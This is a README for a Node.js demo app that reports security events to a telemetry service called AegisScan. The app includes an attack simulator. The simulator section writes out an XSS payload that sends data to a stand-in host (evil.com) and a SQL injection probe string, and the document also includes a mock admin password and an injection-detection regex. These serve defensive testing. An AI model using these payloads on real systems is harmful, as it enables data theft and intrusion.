# 🛡️ AegisScan Security Telemetry Demo App

A modern, high-performance Node.js & Express web application demonstrating real-time cybersecurity telemetry integration with **AegisScan**.

---

## ⚡ Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Environment Configuration
Review or update your `.env` file:
```env
PORT=4000
NODE_ENV=development
SESSION_SECRET=aegis_super_secret_session_key_2026

# Point to your AegisScan instance (local or remote)
AEGISSCAN_ENDPOINT=https://your-aegisscan-instance.vercel.app
AEGISSCAN_API_KEY=aeg_live_your_actual_key
AEGISSCAN_APP_NAME=AegiDemo-Portal
```

### 3. Start the Server
```bash
npm start
# or with automatic reload:
npm run dev
```

Open your browser at **[http://localhost:4000](http://localhost:4000)**.

---

## 🔐 Mock Credentials

| Role | Email | Password |
|---|---|---|
| **Super Admin** | `admin@company.com` | `SecretPassword123` |

---

## 🚀 Features & Telemetry Triggers

| Feature | Route | Telemetry Trigger | Severity | Action |
|---|---|---|---|---|
| **Login Success** | `POST /api/login` | `security.loginSuccess(...)` | `LOW` | `ALLOW` |
| **Login Failure** | `POST /api/login` | `security.loginFailed(...)` | `MEDIUM` | `CHALLENGE` |
| **Unauthorized Admin** | `GET /admin` / `GET /api/admin/data` | `security.unauthorizedAccess(...)` | `HIGH` | `BLOCK` |
| **Admin Portal Access** | `GET /admin` / `GET /api/admin/data` | `security.adminAccess(...)` | `LOW` | `AUDIT` |
| **SQLi / XSS Attack** | `POST /api/search` | `security.suspiciousRequest(...)` | `CRITICAL` | `BLOCK_AND_ISOLATE` |
| **Rate Limit Burst** | `POST /api/simulate/rate-limit` | `security.rateLimitBurst(...)` | `HIGH` | `RATE_LIMIT_DELAY` |

---

## 🧪 Demo Attack Simulator Studio

The application includes an interactive Attack Simulator panel with one-click test buttons:

- 🔘 **Simulate Brute Force Attack**: Fires 6 rapid failed logins across multiple user accounts to trigger credential stuffing heuristics.
- 🔘 **Simulate SQL Injection Probe**: Injects `' OR '1'='1 UNION SELECT ...` to verify WAF/IDS intercept and quarantine.
- 🔘 **Simulate Unauthorized Access (BOLA)**: Sends unauthenticated requests to protected financial/secret key endpoints.
- 🔘 **Simulate Rate Limit Burst**: Floods the server with 10 high-frequency requests in milliseconds.
- 🔘 **Simulate XSS Attack**: Injects `<script>fetch('http://evil.com/leak?...')</script>` to test XSS telemetry filtering.

---

## 📂 Project Structure

```
AegiDemo/
├── .env                  # Environment variables & AegisScan credentials
├── .env.example          # Environment template
├── .gitignore            # Git ignore list
├── package.json          # Node dependencies and scripts
├── server.js             # Express server, routes & IDS security inspect logic
├── aegis-sdk.js          # AegisScan client SDK & event dispatcher
├── public/
│   ├── css/
│   │   └── style.css     # Cyber dark-theme styling & micro-animations
│   └── js/
│       └── app.js        # Dynamic UI controller, toasts & simulator logic
├── views/
│   └── index.ejs         # Modern responsive cybersecurity dashboard
└── README.md             # Project documentation
```

---

## 📡 Sample Telemetry Payload Dispatched to AegisScan

```json
{
  "id": "evt_k9x2pa1m8f2a",
  "event_type": "INJECTION_ATTEMPT_DETECTED",
  "app_name": "AegiDemo-Portal",
  "environment": "development",
  "user_id": "anonymous",
  "source_ip": "127.0.0.1",
  "endpoint": "/api/search",
  "severity": "CRITICAL",
  "status": "blocked",
  "action": "BLOCK_AND_ISOLATE",
  "timestamp": "2026-09-30T07:34:21.000Z",
  "metadata": {
    "attackVector": "SQL_INJECTION",
    "detectedPattern": "/'\\s*(?:or|and)\\s*['\"]?1['\"]?\\s*=\\s*['\"]?1/i",
    "inputPayload": "' OR '1'='1",
    "sdk": "aegisscan-node-client",
    "version": "1.2.0"
  }
}
```

---

## 🛡️ Integration with AegisScan API

Every event is formatted and dispatched via `POST` to:
```
${AEGISSCAN_ENDPOINT}/api/security-events
```
Headers:
```http
Content-Type: application/json
x-api-key: aeg_live_your_actual_key
Authorization: Bearer aeg_live_your_actual_key
```

When offline or testing without an active remote instance, the built-in SDK gracefully falls back to local real-time event buffering so the dashboard and test suite remain 100% interactive!
